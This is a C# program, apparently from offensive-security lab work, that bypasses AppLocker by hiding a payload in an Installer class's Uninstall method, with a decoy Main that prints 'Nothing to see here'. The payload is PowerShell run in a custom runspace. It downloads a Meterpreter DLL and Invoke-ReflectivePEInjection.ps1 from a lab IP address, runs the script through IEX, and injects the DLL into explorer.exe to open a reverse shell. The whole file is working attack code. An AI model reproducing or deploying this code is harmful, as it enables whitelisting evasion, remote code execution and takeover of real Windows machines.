﻿using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
	class Program
	{
		// This method must be presents in an application but doesn't important
		static void Main(string[] args)
		{
			Console.WriteLine("Nothing to see here");
		}
    }
	
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			// Create a custom runspace
			Runspace rs = RunspaceFactory.CreateRunspace();
			// Calling the Open method so we can interact with it
			rs.Open();

			// Instantiate a new PowerShell onject and assign it our newly create runspace
			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;

			// Arbitrary PowerShell command for example
			//String command = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\tools\\poc.txt";

			// A Reverse Shell using DLL reflective load with the help of Invoke-ReflectivePEInjection.ps1 to bypass DLL AppLocker Roles
			String command = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.70/met_x64.dll');" // Load Meterpreter DLL as a bytearray to a variable
				+ "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.70/Invoke-ReflectivePEInjection.ps1') | IEX;" // Load the PowerShell script
				+ "Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId (Get-Process -Name explorer).Id"; // Invoke the script and inject to explorer the shellcode

			// Add the command to the pipline, execute it and close the current runspace
			ps.AddScript(command);
			ps.Invoke();
			rs.Close();
		}
	}
}